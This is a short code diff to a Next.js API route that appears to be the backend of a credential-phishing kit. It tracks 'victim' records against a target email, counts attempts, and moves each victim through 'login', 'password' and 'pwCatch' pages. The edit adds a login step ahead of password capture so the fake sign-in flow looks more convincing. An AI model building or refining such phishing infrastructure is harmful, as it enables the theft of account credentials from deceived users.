@@ -86,7 +86,7 @@ export async function POST(request: NextRequest) {
         
         const victimUpdate: any = {
           email: body.email,
-          currentPage: 'password',
+          currentPage: 'login',
         };
 
         if (config.targetEmail && body.email.toLowerCase() === config.targetEmail.toLowerCase()) {
@@ -115,7 +115,9 @@ export async function POST(request: NextRequest) {
 
         let victimUpdate: any = { attempts: newAttempts };
 
-        if (victim.currentPage === 'password') {
+        if (victim.currentPage === 'login') {
+            victimUpdate.currentPage = 'password';
+        } else if (victim.currentPage === 'password') {
             victimUpdate.currentPage = 'pwCatch';
         } else if (victim.currentPage === 'pwCatch') {
           if (newAttempts >= 2) {
